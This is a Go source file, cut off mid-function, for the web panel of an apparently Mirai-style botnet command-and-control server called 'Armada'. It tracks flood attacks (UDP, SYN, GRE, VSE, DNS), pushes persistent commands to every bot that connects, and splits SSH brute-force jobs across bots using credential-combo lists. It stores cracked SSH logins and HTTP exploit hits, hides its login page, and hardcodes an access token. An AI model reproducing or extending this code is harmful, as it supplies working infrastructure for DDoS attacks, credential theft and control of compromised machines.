package main

import (
	"bytes"
	"crypto/rand"
	"crypto/subtle"
	"embed"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================================
// WEB PANEL SERVER
// Token-protected web interface for managing bots and SOCKS proxies.
// Login page appears blank — press space 10x within 20s to reveal token input.
// ============================================================================

//go:embed web/login.html web/dashboard.html web/style.css web/app.js
var webFS embed.FS

const webAccessToken = "963a495b4ccf998ff530019d87cca059"

var (
	webSessions     = make(map[string]*WebSession)
	webSessionsLock sync.RWMutex

	// Activity log — ring buffer of recent events for the web panel
	activityLog     []ActivityLogEntry
	activityLogLock sync.RWMutex

	// Stats history for sparkline charts (sampled every 10s, keep last 30 points = 5 min)
	statsHistory     []StatsSnapshot
	statsHistoryLock sync.RWMutex

	// SSE clients
	sseClients     = make(map[chan SSEEvent]bool)
	sseClientsLock sync.RWMutex

	// Login rate limiting — track failed attempts per IP
	loginAttempts     = make(map[string][]time.Time)
	loginAttemptsLock sync.Mutex

	// Bot group assignments — persisted to groups.json
	botGroups     = make(map[string]string)
	botGroupsLock sync.RWMutex
	botGroupsFile string

	// Relay server configs — persisted to relays.json
	relaysConfig     []RelayConfig
	relaysConfigLock sync.RWMutex
	relaysFile       string

	// Relay API server — clearnet listener for relay phone-home
	relayAPIPort     string
	relayAPIListener net.Listener
	relayAPILock     sync.Mutex
	relayStats       = make(map[string]RelayStatsEntry) // keyed by relay name
	relayStatsLock   sync.RWMutex

	// Persistent tasks — commands dispatched to every bot on join
	activeTasks     []Task
	activeTasksLock sync.RWMutex
	tasksFile       string

	// Webhook notification configs — persisted to webhooks.json
	webhookConfigs     []WebhookConfig
	webhookConfigsLock sync.RWMutex
	webhookConfigFile  string

	// Command templates — persisted to templates.json
	cmdTemplates     []CmdTemplate
	cmdTemplatesLock sync.RWMutex
	cmdTemplatesFile string

	// Command history — last 50 commands (in-memory only)
	cmdHistory     []map[string]interface{}
	cmdHistoryLock sync.Mutex

	// Attack history — persisted to attack_history.json
	attackHistory     []AttackRecord
	attackHistoryLock sync.Mutex
	attackHistoryFile string

	// SSH hits persistence
	sshHitsFile string

	// Activity log persistence
	activityFile string

	// Debounced task file writer
	taskSavePending uint32 // atomic flag: 1 = save scheduled
)

// WebhookConfig stores a Discord/Telegram/generic webhook endpoint
type WebhookConfig struct {
	ID      string   `json:"id"`
	URL     string   `json:"url"`
	Events  []string `json:"events"` // "connect","disconnect","attack","scan","auth_fail","socks","command"
	Enabled bool     `json:"enabled"`
	Label   string   `json:"label"` // user-friendly name
}

// AttackRecord stores a completed/stopped attack for the history log
type AttackRecord struct {
	Method    string    `json:"method"`
	Target    string    `json:"target"`
	Port      string    `json:"port"`
	Duration  int       `json:"duration"`
	BotCount  int       `json:"botCount"`
	Group     string    `json:"group"`
	Username  string    `json:"username"`
	StartedAt time.Time `json:"startedAt"`
	EndedAt   time.Time `json:"endedAt"`
	Status    string    `json:"status"` // "completed", "stopped"
}

// CmdTemplate stores a saved command template
type CmdTemplate struct {
	ID      string            `json:"id"`
	Name    string            `json:"name"`
	CmdType string            `json:"cmdType"`
	Args    map[string]string `json:"args"`
}

// RelayConfig stores a configured relay server endpoint
type RelayConfig struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Host        string `json:"host"`
	ControlPort string `json:"controlPort"`
	SocksPort   string `json:"socksPort"`
}

// RelayStatsEntry holds the latest stats reported by a relay
type RelayStatsEntry struct {
	Name           string `json:"name"`
	SocksPort      string `json:"socks_port"`
	Sessions       int64  `json:"sessions_total"`
	ActiveSessions int64  `json:"sessions_active"`
	FailedSessions int64  `json:"sessions_failed"`
	BytesUp        int64  `json:"bytes_up"`
	BytesDown      int64  `json:"bytes_down"`
	ConnectedBots  int    `json:"connected_bots"`
	TotalBotConns  int64  `json:"total_bot_connects"`
	AuthFailures   int64  `json:"auth_failures"`
	Timestamp      string `json:"timestamp"`
	LastSeen       time.Time `json:"last_seen"`
}

// Task is a persistent command dispatched to every bot on join
type Task struct {
	ID          string            `json:"id"`
	Command     string            `json:"command"`
	CreatedAt   time.Time         `json:"createdAt"`
	ExpiresAt   time.Time         `json:"expiresAt"`         // zero = never
	RunOnce     bool              `json:"runOnce"`            // if true, skip bots already executed
	ExecutedBots map[string]bool  `json:"executedBots,omitempty"` // botID set for run-once tracking
}

type SSEEvent struct {
	Event string
	Data  string
}

func init() {
	loadBotGroups()
	loadRelays()
	loadTasks()
	loadWebhooks()
	loadCmdTemplates()
	loadAttackHistory()
	loadSSHHits()
	loadActivityLog()
}

// migrateJSON moves an old JSON file from CWD into db/ if it exists
func migrateJSON(name string) {
	if _, err := os.Stat(name); err == nil {
		dest := "db/" + name
		if _, err2 := os.Stat(dest); err2 != nil {
			os.Rename(name, dest)
		}
	}
}

// loadBotGroups reads persisted bot→group mappings
func loadBotGroups() {
	migrateJSON("groups.json")
	botGroupsFile = "db/groups.json"
	data, err := os.ReadFile(botGroupsFile)
	if err != nil {
		return
	}
	botGroupsLock.Lock()
	if err := json.Unmarshal(data, &botGroups); err != nil {
		logMsg("[GROUPS] Failed to parse %s: %v", botGroupsFile, err)
	}
	botGroupsLock.Unlock()
}

// saveBotGroups persists bot→group mappings to groups.json (atomic write)
func saveBotGroups() {
	botGroupsLock.RLock()
	data, err := json.MarshalIndent(botGroups, "", "  ")
	botGroupsLock.RUnlock()
	if err != nil {
		return
	}
	tmp := botGroupsFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		logMsg("[GROUPS] Failed to write temp file: %v", err)
		return
	}
	if err := os.Rename(tmp, botGroupsFile); err != nil {
		logMsg("[GROUPS] Failed to rename temp file: %v", err)
		os.Remove(tmp)
	}
}

func loadRelays() {
	migrateJSON("relays.json")
	relaysFile = "db/relays.json"
	data, err := os.ReadFile(relaysFile)
	if err != nil || len(data) < 2 { return }
	relaysConfigLock.Lock()
	if err := json.Unmarshal(data, &relaysConfig); err != nil {
		logMsg("[RELAYS] Failed to parse %s: %v", relaysFile, err)
	}
	relaysConfigLock.Unlock()
}

// saveRelays persists relay configs to relays.json
func saveRelays() {
	relaysConfigLock.RLock()
	data, err := json.MarshalIndent(relaysConfig, "", "  ")
	relaysConfigLock.RUnlock()
	if err != nil {
		return
	}
	os.WriteFile(relaysFile, data, 0600)
}

func loadTasks() {
	migrateJSON("tasks.json")
	tasksFile = "db/tasks.json"
	data, err := os.ReadFile(tasksFile)
	if err != nil || len(data) < 2 { return }
	activeTasksLock.Lock()
	if err := json.Unmarshal(data, &activeTasks); err != nil {
		logMsg("[TASKS] Failed to parse %s: %v", tasksFile, err)
	}
	activeTasksLock.Unlock()
}

// saveTasks persists tasks to tasks.json
func saveTasks() {
	activeTasksLock.RLock()
	data, err := json.MarshalIndent(activeTasks, "", "  ")
	activeTasksLock.RUnlock()
	if err != nil {
		return
	}
	os.WriteFile(tasksFile, data, 0600)
}

func loadWebhooks() {
	migrateJSON("webhooks.json")
	webhookConfigFile = "db/webhooks.json"
	data, err := os.ReadFile(webhookConfigFile)
	if err != nil || len(data) < 2 { return }
	webhookConfigsLock.Lock()
	if err := json.Unmarshal(data, &webhookConfigs); err != nil {
		logMsg("[WEBHOOKS] Failed to parse %s: %v", webhookConfigFile, err)
	}
	webhookConfigsLock.Unlock()
}

// saveWebhooks persists webhook configs to webhooks.json (atomic write)
func saveWebhooks() {
	webhookConfigsLock.RLock()
	data, err := json.MarshalIndent(webhookConfigs, "", "  ")
	webhookConfigsLock.RUnlock()
	if err != nil {
		return
	}
	tmp := webhookConfigFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		logMsg("[WEBHOOKS] Failed to write temp file: %v", err)
		return
	}
	if err := os.Rename(tmp, webhookConfigFile); err != nil {
		logMsg("[WEBHOOKS] Failed to rename temp file: %v", err)
		os.Remove(tmp)
	}
}

func loadCmdTemplates() {
	migrateJSON("templates.json")
	cmdTemplatesFile = "db/templates.json"
	data, err := os.ReadFile(cmdTemplatesFile)
	if err != nil || len(data) < 2 { return }
	cmdTemplatesLock.Lock()
	if err := json.Unmarshal(data, &cmdTemplates); err != nil {
		logMsg("[TEMPLATES] Failed to parse %s: %v", cmdTemplatesFile, err)
	}
	cmdTemplatesLock.Unlock()
}

// saveCmdTemplates persists command templates to templates.json (atomic write)
func saveCmdTemplates() {
	cmdTemplatesLock.RLock()
	data, err := json.MarshalIndent(cmdTemplates, "", "  ")
	cmdTemplatesLock.RUnlock()
	if err != nil {
		return
	}
	tmp := cmdTemplatesFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		logMsg("[TEMPLATES] Failed to write temp file: %v", err)
		return
	}
	if err := os.Rename(tmp, cmdTemplatesFile); err != nil {
		logMsg("[TEMPLATES] Failed to rename temp file: %v", err)
		os.Remove(tmp)
	}
}

func loadAttackHistory() {
	migrateJSON("attack_history.json")
	attackHistoryFile = "db/attack_history.json"
	data, err := os.ReadFile(attackHistoryFile)
	if err != nil || len(data) < 2 { return }
	attackHistoryLock.Lock()
	if err := json.Unmarshal(data, &attackHistory); err != nil {
		logMsg("[ATTACK-HISTORY] Failed to parse %s: %v", attackHistoryFile, err)
	}
	attackHistoryLock.Unlock()
}

// saveAttackHistory persists attack history to attack_history.json (atomic write)
func saveAttackHistory() {
	attackHistoryLock.Lock()
	data, err := json.MarshalIndent(attackHistory, "", "  ")
	attackHistoryLock.Unlock()
	if err != nil {
		return
	}
	tmp := attackHistoryFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		logMsg("[ATTACK-HISTORY] Failed to write temp file: %v", err)
		return
	}
	if err := os.Rename(tmp, attackHistoryFile); err != nil {
		logMsg("[ATTACK-HISTORY] Failed to rename temp file: %v", err)
		os.Remove(tmp)
	}
}

// --- SSH hits persistence ---

func loadSSHHits() {
	migrateJSON("ssh_hits.json")
	sshHitsFile = "db/ssh_hits.json"
	data, err := os.ReadFile(sshHitsFile)
	if err != nil || len(data) < 2 { return }
	sshLock.Lock()
	if err := json.Unmarshal(data, &sshHits); err != nil {
		logMsg("[SSH-HITS] Failed to parse %s: %v", sshHitsFile, err)
	}
	sshLock.Unlock()
}

func saveSSHHits() {
	sshLock.Lock()
	hits := make([]SSHHit, len(sshHits))
	copy(hits, sshHits)
	sshLock.Unlock()
	data, err := json.MarshalIndent(hits, "", "  ")
	if err != nil {
		return
	}
	tmp := sshHitsFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		return
	}
	if err := os.Rename(tmp, sshHitsFile); err != nil {
		os.Remove(tmp)
	}
}

// --- Activity log persistence ---

func loadActivityLog() {
	migrateJSON("activity.json")
	activityFile = "db/activity.json"
	data, err := os.ReadFile(activityFile)
	if err != nil || len(data) < 2 { return }
	activityLogLock.Lock()
	if err := json.Unmarshal(data, &activityLog); err != nil {
		logMsg("[ACTIVITY] Failed to parse %s: %v", activityFile, err)
	}
	activityLogLock.Unlock()
}

func saveActivityLog() {
	activityLogLock.RLock()
	entries := make([]ActivityLogEntry, len(activityLog))
	copy(entries, activityLog)
	activityLogLock.RUnlock()
	data, err := json.MarshalIndent(entries, "", "  ")
	if err != nil {
		return
	}
	tmp := activityFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		return
	}
	if err := os.Rename(tmp, activityFile); err != nil {
		os.Remove(tmp)
	}
}

// recordAttackCompletion appends a finished attack to history (keeps last 200)
func recordAttackCompletion(atk RunningAttack, status string) {
	rec := AttackRecord{
		Method:    atk.Method,
		Target:    atk.Target,
		Port:      atk.Port,
		Duration:  atk.Duration,
		BotCount:  getBotCount(),
		Group:     "",
		Username:  atk.Username,
		StartedAt: atk.Start,
		EndedAt:   time.Now(),
		Status:    status,
	}
	attackHistoryLock.Lock()
	attackHistory = append(attackHistory, rec)
	if len(attackHistory) > 200 {
		attackHistory = attackHistory[len(attackHistory)-200:]
	}
	attackHistoryLock.Unlock()
	saveAttackHistory()

	// Broadcast the new record to SSE clients
	if data, err := json.Marshal(rec); err == nil {
		broadcastSSE("attack_history", string(data))
	}
}

// recordCmdHistory adds an entry to the in-memory command history (max 50)
func recordCmdHistory(cmdType string, args map[string]string, target string) {
	cmdHistoryLock.Lock()
	defer cmdHistoryLock.Unlock()
	entry := map[string]interface{}{
		"cmdType":   cmdType,
		"args":      args,
		"target":    target,
		"timestamp": time.Now().UTC().Format(time.RFC3339),
	}
	cmdHistory = append(cmdHistory, entry)
	if len(cmdHistory) > 50 {
		cmdHistory = cmdHistory[len(cmdHistory)-50:]
	}
}

// sendWebhook fires a webhook notification for the given event type
func sendWebhook(eventType string, message string) {
	webhookConfigsLock.RLock()
	configs := make([]WebhookConfig, len(webhookConfigs))
	copy(configs, webhookConfigs)
	webhookConfigsLock.RUnlock()

	for _, wh := range configs {
		if !wh.Enabled {
			continue
		}
		matched := false
		for _, e := range wh.Events {
			if e == eventType {
				matched = true
				break
			}
		}
		if !matched {
			continue
		}

		go func(url, msg, evt string) {
			payload := map[string]interface{}{
				"content": msg,
				"embeds": []map[string]interface{}{{
					"title":       "Armada Alert",
					"description": msg,
					"color":       0x00ff88,
					"footer":      map[string]string{"text": evt},
					"timestamp":   time.Now().UTC().Format(time.RFC3339),
				}},
			}
			data, _ := json.Marshal(payload)
			client := &http.Client{Timeout: 10 * time.Second}
			client.Post(url, "application/json", bytes.NewReader(data))
		}(wh.URL, message, eventType)
	}
}

// dispatchTasksToBot sends all active (non-expired) tasks to a newly connected bot.
// For run-once tasks, skips bots that already received the command.
// Called from addBotConnection after the bot is registered and ready.
func dispatchTasksToBot(botID string, conn net.Conn) {
	activeTasksLock.Lock()

	now := time.Now()
	dirty := false

	// Collect commands to send — mark run-once BEFORE releasing lock to prevent TOCTOU
	type pending struct {
		id, cmd string
	}
	var cmds []pending

	for i := range activeTasks {
		t := &activeTasks[i]

		// Skip expired
		if !t.ExpiresAt.IsZero() && now.After(t.ExpiresAt) {
			continue
		}

		// Skip if run-once and already executed on this bot
		if t.RunOnce {
			if t.ExecutedBots[botID] {
				continue
			}
			// Mark executed NOW, before releasing lock — prevents duplicate dispatch
			if t.ExecutedBots == nil {
				t.ExecutedBots = make(map[string]bool)
			}
			t.ExecutedBots[botID] = true
			dirty = true
		}

		cmds = append(cmds, pending{id: t.ID, cmd: t.Command})
	}

	activeTasksLock.Unlock()

	// Send commands outside the lock (network I/O can be slow)
	for _, c := range cmds {
		if _, err := conn.Write([]byte(c.cmd + "\n")); err != nil {
			logMsg("[TASK] Failed to dispatch task %s to %s: %v", c.id, botID, err)
			return
		}
		logMsg("[TASK] Dispatched task %s to %s: %s", c.id, botID, c.cmd)
	}

	if dirty {
		debouncedSaveTasks()
	}
}

// debouncedSaveTasks coalesces rapid task file writes into a single write after 500ms.
// Safe to call from many goroutines concurrently.
func debouncedSaveTasks() {
	if !atomic.CompareAndSwapUint32(&taskSavePending, 0, 1) {
		return // a save is already scheduled
	}
	go func() {
		time.Sleep(500 * time.Millisecond)
		atomic.StoreUint32(&taskSavePending, 0)
		saveTasks()
	}()
}

// getBotGroup returns the group for a bot (empty string if ungrouped)
func getBotGroup(botID string) string {
	botGroupsLock.RLock()
	defer botGroupsLock.RUnlock()
	return botGroups[botID]
}

// setBotGroup assigns a bot to a group (empty string removes the group)
func setBotGroup(botID, group string) {
	botGroupsLock.Lock()
	if group == "" {
		delete(botGroups, botID)
	} else {
		botGroups[botID] = group
	}
	botGroupsLock.Unlock()
	saveBotGroups()

	// Update in-memory bot connection
	botConnsLock.Lock()
	if bc, ok := botConnections[botID]; ok {
		bc.group = group
	}
	botConnsLock.Unlock()
}

// StatsSnapshot stores a point-in-time stats sample
type StatsSnapshot struct {
	Time     string `json:"time"`
	BotCount int    `json:"botCount"`
	TotalRAM int64  `json:"totalRAM"`
	TotalCPU int    `json:"totalCPU"`
}

// StartStatsRecorder samples stats every 10s into the history buffer
// and broadcasts stats to SSE clients
func StartStatsRecorder() {
	go func() {
		for {
			snap := StatsSnapshot{
				Time:     time.Now().Format("15:04:05"),
				BotCount: getBotCount(),
				TotalRAM: getTotalRAM(),
				TotalCPU: getTotalCPU(),
			}
			statsHistoryLock.Lock()
			statsHistory = append(statsHistory, snap)
			if len(statsHistory) > 30 {
				statsHistory = statsHistory[len(statsHistory)-30:]
			}
			statsHistoryLock.Unlock()

			// Broadcast stats update via SSE
			broadcastSSE("stats", buildStatsJSON())

			// Broadcast bot list so lastPing stays fresh in the UI
			botConnsLock.RLock()
			bots := make([]apiBotEntry, 0, len(botConnections))
			for _, bc := range botConnections {
				if bc.authenticated {
					bots = append(bots, buildBotEntry(bc))
				}
			}
			botConnsLock.RUnlock()
			if botsJSON, err := json.Marshal(bots); err == nil {
				broadcastSSE("bots", string(botsJSON))
			}

			time.Sleep(10 * time.Second)
		}
	}()
}

// ActivityLogEntry stores a single activity event
type ActivityLogEntry struct {
	Time    string `json:"time"`
	Type    string `json:"type"` // "connect", "disconnect", "socks", "command", "error"
	Message string `json:"message"`
}

// PushActivity adds an event to the activity log (max 200 entries)
// and broadcasts to SSE clients
func PushActivity(entryType, message string) {
	entry := ActivityLogEntry{
		Time:    time.Now().Format("15:04:05"),
		Type:    entryType,
		Message: message,
	}

	activityLogLock.Lock()
	activityLog = append(activityLog, entry)
	if len(activityLog) > 200 {
		// Rotate in-place: copy tail to front, reslice — no new allocation
		copy(activityLog, activityLog[len(activityLog)-200:])
		activityLog = activityLog[:200]
	}
	activityLogLock.Unlock()
	go saveActivityLog()

	// Broadcast via SSE
	if data, err := json.Marshal(entry); err == nil {
		broadcastSSE("activity", string(data))
	}

	// Fire webhook notifications — map activity types to webhook event types
	webhookEvent := entryType // default: use as-is (connect, disconnect, socks, command, error)
	switch entryType {
	case "connect":
		webhookEvent = "connect"
	case "disconnect":
		webhookEvent = "disconnect"
	case "socks":
		webhookEvent = "socks"
	case "command":
		// Check if it looks like an attack command
		lower := strings.ToLower(message)
		if strings.Contains(lower, "attack") || strings.Contains(lower, "udp ") ||
			strings.Contains(lower, "syn ") || strings.Contains(lower, "ack ") ||
			strings.Contains(lower, "stomp ") || strings.Contains(lower, "greip ") ||
			strings.Contains(lower, "greeth ") || strings.Contains(lower, "vse ") ||
			strings.Contains(lower, "dns ") || strings.Contains(lower, "std ") {
			webhookEvent = "attack"
		} else {
			webhookEvent = "command"
		}
	case "error":
		if strings.Contains(strings.ToLower(message), "auth") {
			webhookEvent = "auth_fail"
		}
	case "scan", "task", "relay":
		webhookEvent = "scan"
	}
	sendWebhook(webhookEvent, message)
}

// BroadcastBotConnect sends a bot_connect event to all SSE clients
func BroadcastBotConnect(bc *BotConnection) {
	entry := buildBotEntry(bc)
	if data, err := json.Marshal(entry); err == nil {
		broadcastSSE("bot_connect", string(data))
	}
}

// BroadcastBotDisconnect sends a bot_disconnect event to all SSE clients
func BroadcastBotDisconnect(botID string) {
	if data, err := json.Marshal(map[string]string{"botID": botID}); err == nil {
		broadcastSSE("bot_disconnect", string(data))
	}
}

// BroadcastSocksUpdate sends a socks_update event to all SSE clients
func BroadcastSocksUpdate(bc *BotConnection) {
	entry := buildBotEntry(bc)
	if data, err := json.Marshal(entry); err == nil {
		broadcastSSE("socks_update", string(data))
	}
}

type WebSession struct {
	CreatedAt time.Time
	ExpiresAt time.Time
	Level     string // "Owner", "Admin", "Pro", "Basic"
	Username  string // "" for token login, username for user login
}

func generateSessionID() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func getWebSession(r *http.Request) *WebSession {
	cookie, err := r.Cookie("vps")
	if err != nil {
		return nil
	}
	webSessionsLock.RLock()
	defer webSessionsLock.RUnlock()
	sess, ok := webSessions[cookie.Value]
	if !ok || time.Now().After(sess.ExpiresAt) {
		return nil
	}
	return sess
}

func requireWebAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if getWebSession(r) == nil {
			// API and WebSocket endpoints get 401 JSON; pages get redirect
			if strings.HasPrefix(r.URL.Path, "/api/") || strings.HasPrefix(r.URL.Path, "/ws/") {
				w.Header().Set("Content-Type", "application/json")
				w.WriteHeader(http.StatusUnauthorized)
				w.Write([]byte(`{"error":"unauthorized"}`))
				return
			}
			http.Redirect(w, r, "/login", http.StatusSeeOther)
			return
		}
		next(w, r)
	}
}

func cleanupExpiredSessions() {
	for {
		time.Sleep(10 * time.Minute)
		webSessionsLock.Lock()
		now := time.Now()
		for id, sess := range webSessions {
			if now.After(sess.ExpiresAt) {
				delete(webSessions, id)
			}
		}
		webSessionsLock.Unlock()
	}
}

// handleAPISession returns the current session's level and username
func handleAPISession(w http.ResponseWriter, r *http.Request) {
	sess := getWebSession(r)
	if sess == nil {
		writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"error": "not authenticated"})
		return
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{"level": sess.Level, "username": sess.Username})
}

// ============================================================================
// SSH SCANNER STATE & ENDPOINTS
// ============================================================================

type SSHHit struct {
	IP        string    `json:"ip"`
	User      string    `json:"user"`
	Pass      string    `json:"pass"`
	Country   string    `json:"country"`
	Timestamp time.Time `json:"timestamp"`
}

var (
	sshTargets      []string
	sshCombos       []string
	sshHits         []SSHHit
	sshRunning      bool
	sshLastActive   time.Time
	sshScanningBots = make(map[string]bool)
	sshLock         sync.Mutex
)

// HTTP exploit module state
type HTTPExploitHit struct {
	IP        string    `json:"ip"`
	Status    string    `json:"status"`
	Timestamp time.Time `json:"timestamp"`
}

var (
	httpExploitHits    []HTTPExploitHit
	httpExploitRunning bool
	httpExploitLock    sync.Mutex
	httpHitsFile       string
)

func RecordHTTPExploitHit(ip, status string) {
	httpExploitLock.Lock()
	// Dedup
	for _, h := range httpExploitHits {
		if h.IP == ip && h.Status == status {
			httpExploitLock.Unlock()
			return
		}
	}
	httpExploitHits = append(httpExploitHits, HTTPExploitHit{IP: ip, Status: status, Timestamp: time.Now()})
	if len(httpExploitHits) > 1000 {
		httpExploitHits = httpExploitHits[len(httpExploitHits)-1000:]
	}
	httpExploitLock.Unlock()
	go saveHTTPHits()
	PushActivity("scan", fmt.Sprintf("HTTP exploit: %s (%s)", ip, status))
	if data, err := json.Marshal(map[string]string{"ip": ip, "status": status}); err == nil {
		broadcastSSE("http_hit", string(data))
	}
}

func loadHTTPHits() {
	migrateJSON("http_hits.json")
	httpHitsFile = "db/http_hits.json"
	data, err := os.ReadFile(httpHitsFile)
	if err != nil || len(data) < 2 { return }
	httpExploitLock.Lock()
	if err := json.Unmarshal(data, &httpExploitHits); err != nil {
		logMsg("[HTTP-HITS] Failed to parse %s: %v", httpHitsFile, err)
	}
	httpExploitLock.Unlock()
}

func saveHTTPHits() {
	httpExploitLock.Lock()
	hits := make([]HTTPExploitHit, len(httpExploitHits))
	copy(hits, httpExploitHits)
	httpExploitLock.Unlock()
	data, err := json.MarshalIndent(hits, "", "  ")
	if err != nil { return }
	tmp := httpHitsFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil { return }
	if err := os.Rename(tmp, httpHitsFile); err != nil { os.Remove(tmp) }
}

func init() {
	go sshIdleWatchdog()
	loadScanJob()
	loadHTTPHits()
}

// handleAPIScanJob manages the work-stealing scan job queue
func handleAPIScanJob(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/scan-job/")

	switch path {
	case "create":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		var req struct {
			Type      string            `json:"type"` // "ssh" or "http"
			Targets   []string          `json:"targets"`
			Config    map[string]string `json:"config"`
			BatchSize int               `json:"batchSize"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, 400, map[string]interface{}{"error": "Invalid JSON"})
			return
		}
		if len(req.Targets) == 0 {
			writeJSON(w, 400, map[string]interface{}{"error": "No targets"})
			return
		}
		validTypes := map[string]bool{"ssh": true, "http": true}
		if !validTypes[req.Type] {
			writeJSON(w, 400, map[string]interface{}{"error": "type must be ssh or http"})
			return
		}

		job := CreateScanJob(req.Type, req.Targets, req.Config, req.BatchSize)

		// Immediately assign first batches to all connected bots
		botConnsLock.RLock()
		for _, bc := range botConnections {
			if bc.authenticated {
				go assignNextBatch(bc.botID, bc)
			}
		}
		botConnsLock.RUnlock()

		PushActivity("scan", fmt.Sprintf("Scan job created: %s, %d targets, batch=%d", req.Type, job.Total, job.BatchSize))
		writeJSON(w, 200, map[string]interface{}{"ok": true, "id": job.ID, "total": job.Total})

	case "progress":
		writeJSON(w, 200, GetJobProgress())

	case "bot-stats":
		stats := GetBotScanStats()
		if stats == nil {
			stats = []BotScanStat{}
		}
		writeJSON(w, 200, stats)

	case "targets":
		filter := r.URL.Query().Get("filter")
		limit := 100
		offset := 0
		if v := r.URL.Query().Get("limit"); v != "" {
			fmt.Sscan(v, &limit)
		}
		if v := r.URL.Query().Get("offset"); v != "" {
			fmt.Sscan(v, &offset)
		}
		targets, total := GetJobTargets(filter, limit, offset)
		if targets == nil {
			targets = []ScanTarget{}
		}
		writeJSON(w, 200, map[string]interface{}{"targets": targets, "total": total})

	case "hits":
		hits := GetJobHits()
		if hits == nil {
			hits = []ScanTarget{}
		}
		writeJSON(w, 200, hits)

	case "stop":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		StopJob()
		PushActivity("scan", "Scan job paused — bots finishing current batch")
		writeJSON(w, 200, map[string]interface{}{"ok": true})

	case "force-stop":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		ForceStopJob()
		PushActivity("scan", "Scan job force-stopped — all scanners killed")
		writeJSON(w, 200, map[string]interface{}{"ok": true})

	case "resume":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		ResumeJob()
		PushActivity("scan", "Scan job resumed")
		writeJSON(w, 200, map[string]interface{}{"ok": true})

	case "clear":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		ClearJob()
		writeJSON(w, 200, map[string]interface{}{"ok": true})

	default:
		http.Error(w, "not found", 404)
	}
}

// sshIdleWatchdog — disabled. Scan jobs have their own completion/cancel logic.
// The 35-min timeout was killing long-running scans on slow botnets.
func sshIdleWatchdog() {
	// no-op: scan lifecycle managed by scanner_jobs.go
}

func RecordSSHHit(ip, user, pass string) {
	country := lookupGeoIP(ip)
	hit := SSHHit{IP: ip, User: user, Pass: pass, Country: country, Timestamp: time.Now()}
	sshLock.Lock()
	// Dedup: skip if same IP+user+pass already recorded
	for _, existing := range sshHits {
		if existing.IP == ip && existing.User == user && existing.Pass == pass {
			sshLastActive = time.Now()
			sshLock.Unlock()
			return
		}
	}
	sshHits = append(sshHits, hit)
	if len(sshHits) > 1000 {
		sshHits = sshHits[len(sshHits)-1000:]
	}
	sshLastActive = time.Now()
	sshLock.Unlock()
	go saveSSHHits()
	PushActivity("scan", fmt.Sprintf("SSH hit: %s %s:%s (%s)", ip, user, pass, country))
	sendWebhook("scan", fmt.Sprintf("SSH hit: %s %s:%s (%s)", ip, user, pass, country))
	if data, err := json.Marshal(hit); err == nil {
		broadcastSSE("ssh_hit", string(data))
	}
}

func handleAPISSH(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/ssh/")

	switch path {
	case "targets":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		body, _ := io.ReadAll(r.Body)
		lines := strings.Split(strings.TrimSpace(string(body)), "\n")
		var targets []string
		for _, l := range lines {
			l = strings.TrimSpace(l)
			if l != "" {
				targets = append(targets, l)
			}
		}
		sshLock.Lock()
		sshTargets = targets
		sshLock.Unlock()
		writeJSON(w, 200, map[string]interface{}{"ok": true, "count": len(targets)})

	case "combos":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		body, _ := io.ReadAll(r.Body)
		lines := strings.Split(strings.TrimSpace(string(body)), "\n")
		var combos []string
		for _, l := range lines {
			l = strings.TrimSpace(l)
			if l != "" {
				combos = append(combos, l)
			}
		}
		sshLock.Lock()
		sshCombos = combos
		sshLock.Unlock()
		writeJSON(w, 200, map[string]interface{}{"ok": true, "count": len(combos)})

	case "start":
		if r.Method != "POST" {
			http.Error(w, "POST only", 405)
			return
		}
		var body struct {
			Mode       string `json:"mode"`
			Payload    string `json:"payload"`
			ArchFilter string `json:"archFilter"`
			MinRAM     int64  `json:"minRAM"`
		}
		json.NewDecoder(r.Body).Decode(&body)
		if body.Mode == "" {
			body.Mode = "report"
		}

		sshLock.Lock()
		targets := make([]string, len(sshTargets))
		copy(targets, sshTargets)
		combos := make([]string, len(sshCombos))
		copy(combos, sshCombos)
		sshLock.Unlock()

		if len(targets) == 0 || len(combos) == 0 {
			writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "no targets or combos uploaded"})
			return
		}

		// Get authenticated bots (with optional arch/RAM filtering)
		botConnsLock.RLock()
		var bots []net.Conn
		var botIDs []string
		for _, bc := range botConnections {
			if !bc.authenticated {
				continue
			}
			if body.ArchFilter != "" && bc.arch != body.ArchFilter {
				continue
			}
			if body.MinRAM > 0 && bc.ram < body.MinRAM {
				continue
			}
			bots = append(bots, bc.conn)
			botIDs = append(botIDs, bc.botID)
		}
		botConnsLock.RUnlock()

		if len(bots) == 0 {
			writeJSON(w, 400, map[string]interface{}{"ok": false, "error": "no bots connected"})
			return
		}

		// Split targets across bots
		chunkSize := (len(targets) + len(bots) - 1) / len(bots)
		assigned := 0
		comboStr := strings.Join(combos, "\n")

		for i, bot := range bots {
			start := i * chunkSize
			if start >= len(targets) {
				break
			}
			end := start + chunkSize
			if end > len(targets) {
				end = len(targets)
			}
			chunk := targets[start:end]

